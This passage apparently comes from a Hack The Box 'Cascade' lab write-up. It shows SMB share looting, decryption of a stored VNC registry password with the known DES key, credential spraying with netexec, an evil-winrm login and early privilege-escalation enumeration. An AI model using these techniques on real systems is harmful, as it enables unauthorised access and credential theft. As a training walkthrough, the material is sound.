</span><span id="__span-28-60"><a id="__codelineno-28-60" name="__codelineno-28-60" href="#__codelineno-28-60"></a><span class="w">  </span>VNC<span class="w"> </span>Install.reg<span class="w">                     </span>A<span class="w">     </span><span class="m">2680</span><span class="w">  </span>Tue<span class="w"> </span>Jan<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">14</span>:27:44<span class="w"> </span><span class="m">2020</span>
</span></code></pre></div>
<p>that works, but for our convenience, we can download all the contents of /Data share locally:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>smbclient<span class="w"> </span><span class="s1">&#39;//cascade.htb/Data&#39;</span><span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;prompt OFF;recurse ON;cd &#39;</span>//cascade.htb/Data<span class="s1">&#39;;lcd &#39;</span>/root/HTB/cascade/smb_shares/<span class="s1">&#39;;mget *&#39;</span><span class="w"> </span>-U<span class="w"> </span>r.thompson%rY4n5eva
</span></code></pre></div></p>
<p>on the <code>/IT/Email Archives/Meeting_Notes_June_2018.html</code> i found this:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>From:<span class="w"> </span>Steve<span class="w"> </span>Smith<span class="w"> </span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>-<span class="w"> </span>We<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>using<span class="w"> </span>a<span class="w"> </span>temporary<span class="w"> </span>account<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>all<span class="w"> </span>tasks<span class="w"> </span>related<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>network<span class="w"> </span>migration<span class="w"> </span>and<span class="w"> </span>this<span class="w"> </span>account<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>deleted<span class="w"> </span>at<span class="w"> </span>the<span class="w"> </span>end<span class="w"> </span>of<span class="w"> </span><span class="m">2018</span><span class="w"> </span>once<span class="w"> </span>the<span class="w"> </span>migration<span class="w"> </span>is<span class="w"> </span>complete.<span class="w"> </span>This<span class="w"> </span>will<span class="w"> </span>allow<span class="w"> </span>us<span class="w"> </span>to<span class="w"> </span>identify<span class="w"> </span>actions<span class="w"> </span>related<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>migration<span class="w"> </span><span class="k">in</span><span class="w"> </span>security<span class="w"> </span>logs<span class="w"> </span>etc.<span class="w"> </span>Username<span class="w"> </span>is<span class="w"> </span>TempAdmin<span class="w"> </span><span class="o">(</span>password<span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>as<span class="w"> </span>the<span class="w"> </span>normal<span class="w"> </span>admin<span class="w"> </span>account<span class="w"> </span>password<span class="o">)</span>.<span class="w"> </span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>-<span class="w"> </span>The<span class="w"> </span>winner<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>Best<span class="w"> </span>GPO<span class="w"> </span>competition<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>announced<span class="w"> </span>on<span class="w"> </span>Friday<span class="w"> </span>so<span class="w"> </span>get<span class="w"> </span>your<span class="w"> </span>submissions<span class="w"> </span><span class="k">in</span><span class="w"> </span>soon.
</span></code></pre></div><br />
so we have the sender steve smith and a temp user<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Steve<span class="w"> </span>Smith
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>TempAdmin
</span></code></pre></div><br />
(it also mentioned gpo, which is an existent domain group, we will keep that in mind for later, if it )</p>
<h4 id="decrypting-encrypted-text">Decrypting encrypted text</h4>
<p>since this info seems insufficient to move forward, i searched more, and inspected this file:<br />
<code>IT/Temp/s.smith/VNC Install.reg</code> on <code>s.smith</code> folder<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="s2">&quot;Password&quot;</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
</span></code></pre></div><br />
decoding it to text:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>6bcf2a4b6e5aca0f<span class="w"> </span>-&gt;<span class="w"> </span>k*KnZ
</span></code></pre></div><br />
Appears sth unreadable, might be encrypted.</p>
<p>The filename indicates VNC related file, lets find more info about it:<br />
<code>A .reg file, or registry file, is==a text file used to modify the Windows Registry==.It can be used to automate VNC (Virtual Network Computing) installations by adding registry keys and values, including settings like the VNC password, connection options, and other configurations.These files simplify the process of configuring VNC, especially when deploying it to multiple machines.</code><br />
and also found this:<br />
<code>"Password"=hex:xx,xx,xx,xx ; Replace with your base64 encoded password</code></p>
<p>and based on this: https://github.com/frizb/PasswordDecrypts<br />
i decrypted it, using native linux tools:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span>6bcf2a4b6e5aca0f<span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-r<span class="w"> </span>-p<span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>enc<span class="w"> </span>-des-cbc<span class="w"> </span>--nopad<span class="w"> </span>--nosalt<span class="w"> </span>-K<span class="w"> </span>e84ad660c4721ae0<span class="w"> </span>-iv<span class="w"> </span><span class="m">0000000000000000</span><span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>hexdump<span class="w"> </span>-Cv
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="m">00000000</span><span class="w">  </span><span class="m">73</span><span class="w"> </span><span class="m">54</span><span class="w"> </span><span class="m">33</span><span class="w"> </span><span class="m">33</span><span class="w"> </span><span class="m">33</span><span class="w"> </span><span class="m">76</span><span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">32</span><span class="w">                           </span><span class="p">|</span>sT333ve2<span class="p">|</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="m">00000008</span>
</span></code></pre></div><br />
so it seems that this password is <code>sT333ve2</code>, and since it was inside the <code>s.smith</code> folder, the new creds we obtained are:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>s.smith
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>sT333ve2
</span></code></pre></div></p>
<h4 id="logging-in-as-ssmith">Logging in as <code>s.smith</code></h4>
<p>Lets check again with nxc (via my automated script) towards what services we can login with those creds:<br />
https://github.com/ch3ckkm8/auto_netexec<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>cascade.htb<span class="w"> </span><span class="s1">&#39;s.smith&#39;</span><span class="w"> </span><span class="s1">&#39;sT333ve2&#39;</span>
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">5985</span><span class="w">   </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">5985</span><span class="w">   </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\s</span>.smith:sT333ve2<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">445</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">445</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\s</span>.smith:sT333ve2<span class="w"> </span>
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">445</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">389</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\s</span>.smith:sT333ve2<span class="w"> </span>
</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a>
</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a>
</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-38-21"><a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a>RPC<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">135</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span>Build<span class="w"> </span><span class="m">7601</span><span class="w"> </span><span class="o">(</span>name:CASC-DC1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:cascade.local<span class="o">)</span>
</span><span id="__span-38-22"><a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a>RPC<span class="w">         </span><span class="m">10</span>.10.10.182<span class="w">    </span><span class="m">135</span><span class="w">    </span>CASC-DC1<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cascade.local<span class="se">\s</span>.smith:sT333ve2<span class="w"> </span>
</span><span id="__span-38-23"><a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a>
</span><span id="__span-38-24"><a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-25"><a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-38-26"><a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a>
</span><span id="__span-38-27"><a id="__codelineno-38-27" name="__codelineno-38-27" href="#__codelineno-38-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-28"><a id="__codelineno-38-28" name="__codelineno-38-28" href="#__codelineno-38-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-38-29"><a id="__codelineno-38-29" name="__codelineno-38-29" href="#__codelineno-38-29"></a>
</span><span id="__span-38-30"><a id="__codelineno-38-30" name="__codelineno-38-30" href="#__codelineno-38-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-31"><a id="__codelineno-38-31" name="__codelineno-38-31" href="#__codelineno-38-31"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-38-32"><a id="__codelineno-38-32" name="__codelineno-38-32" href="#__codelineno-38-32"></a>
</span><span id="__span-38-33"><a id="__codelineno-38-33" name="__codelineno-38-33" href="#__codelineno-38-33"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-34"><a id="__codelineno-38-34" name="__codelineno-38-34" href="#__codelineno-38-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-38-35"><a id="__codelineno-38-35" name="__codelineno-38-35" href="#__codelineno-38-35"></a>
</span><span id="__span-38-36"><a id="__codelineno-38-36" name="__codelineno-38-36" href="#__codelineno-38-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>cascade.htb...
</span><span id="__span-38-37"><a id="__codelineno-38-37" name="__codelineno-38-37" href="#__codelineno-38-37"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div><br />
great! according to the output above, it seems we can login in via win-rm<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>cascade.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;s.smith&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;sT333ve2&#39;</span>
</span></code></pre></div><br />
logged in succesfully and grabbed the user flag<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>cac743f518f998d53ce20a3e24e45756
</span></code></pre></div></p>
<hr />
<h1 id="privesc">Privesc</h1>
<h4 id="bloodhound">BloodHound</h4>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;s.smith&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;sT333ve2&#39;</span><span class="w">  </span>-d<span class="w"> </span>cascade.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.10.10.182<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div><br />
it did not work, so lets try to find info from the inside</p>
<h4 id="group-membership-of-user-ssmith">Group membership of user <code>s.smith</code></h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>net<span class="w"> </span>user<span class="w"> </span>s.smith
</span></code></pre></div>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>User<span class="w"> </span>name<span class="w">                    </span>s.smith
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>Full<span class="w"> </span>Name<span class="w">                    </span>Steve<span class="w"> </span>Smith
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>Comment
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>User<span class="err">&#39;</span>s<span class="w"> </span>comment
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>Country<span class="w"> </span>code<span class="w">                 </span><span class="m">000</span><span class="w"> </span><span class="o">(</span>System<span class="w"> </span>Default<span class="o">)</span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>Account<span class="w"> </span>active<span class="w">               </span>Yes
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>Account<span class="w"> </span>expires<span class="w">              </span>Never
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>
</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>Password<span class="w"> </span>last<span class="w"> </span><span class="nb">set</span><span class="w">            </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">8</span>:58:05<span class="w"> </span>PM
</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>Password<span class="w"> </span>expires<span class="w">             </span>Never
</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a>Password<span class="w"> </span>changeable<span class="w">          </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">8</span>:58:05<span class="w"> </span>PM
</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a>Password<span class="w"> </span>required<span class="w">            </span>Yes
</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a>User<span class="w"> </span>may<span class="w"> </span>change<span class="w"> </span>password<span class="w">     </span>No
</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a>
</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a>Workstations<span class="w"> </span>allowed<span class="w">         </span>All
</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a>Logon<span class="w"> </span>script<span class="w">                 </span>MapAuditDrive.vbs
</span><span id="__span-43-17"><a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a>User<span class="w"> </span>profile
</span><span id="__span-43-18"><a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a>Home<span class="w"> </span>directory
</span><span id="__span-43-19"><a id="__codelineno-43-19" name="__codelineno-43-19" href="#__codelineno-43-19"></a>Last<span class="w"> </span>logon<span class="w">                   </span><span class="m">1</span>/29/2020<span class="w"> </span><span class="m">12</span>:26:39<span class="w"> </span>AM
</span><span id="__span-43-20"><a id="__codelineno-43-20" name="__codelineno-43-20" href="#__codelineno-43-20"></a>
</span><span id="__span-43-21"><a id="__codelineno-43-21" name="__codelineno-43-21" href="#__codelineno-43-21"></a>Logon<span class="w"> </span>hours<span class="w"> </span>allowed<span class="w">          </span>All
</span><span id="__span-43-22"><a id="__codelineno-43-22" name="__codelineno-43-22" href="#__codelineno-43-22"></a>
</span><span id="__span-43-23"><a id="__codelineno-43-23" name="__codelineno-43-23" href="#__codelineno-43-23"></a>Local<span class="w"> </span>Group<span class="w"> </span>Memberships<span class="w">      </span>*Audit<span class="w"> </span>Share<span class="w">          </span>*IT
</span><span id="__span-43-24"><a id="__codelineno-43-24" name="__codelineno-43-24" href="#__codelineno-43-24"></a><span class="w">                             </span>*Remote<span class="w"> </span>Management<span class="w"> </span>Use
</span><span id="__span-43-25"><a id="__codelineno-43-25" name="__codelineno-43-25" href="#__codelineno-43-25"></a>Global<span class="w"> </span>Group<span class="w"> </span>memberships<span class="w">     </span>*Domain<span class="w"> </span>Users
</span><span id="__span-43-26"><a id="__codelineno-43-26" name="__codelineno-43-26" href="#__codelineno-43-26"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div><br />
hm <code>Audit Share</code> is not a common micsoroft group, lets inspect it first:</p>
<h4 id="local-group-details">Local group details</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>net<span class="w"> </span>localgroup<span class="w"> </span><span class="s2">&quot;Audit Share&quot;</span>
</span></code></pre></div>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Alias<span class="w"> </span>name<span class="w">     </span>Audit<span class="w"> </span>Share
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>Comment<span class="w">        </span><span class="se">\\</span>Casc-DC1<span class="se">\A</span>udit$
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>Members
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>-------------------------------------------------------------------------------
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>s.smith
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div><br />
The comment <code>\\Casc-DC1\Audit$</code> is useful, we can now see what does this share contain by browsing through the directories: <br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\S</span>hares<span class="se">\a</span>udit&gt;<span class="w"> </span>ls
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>Directory:<span class="w"> </span>C:<span class="se">\S</span>hares<span class="se">\a</span>udit
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
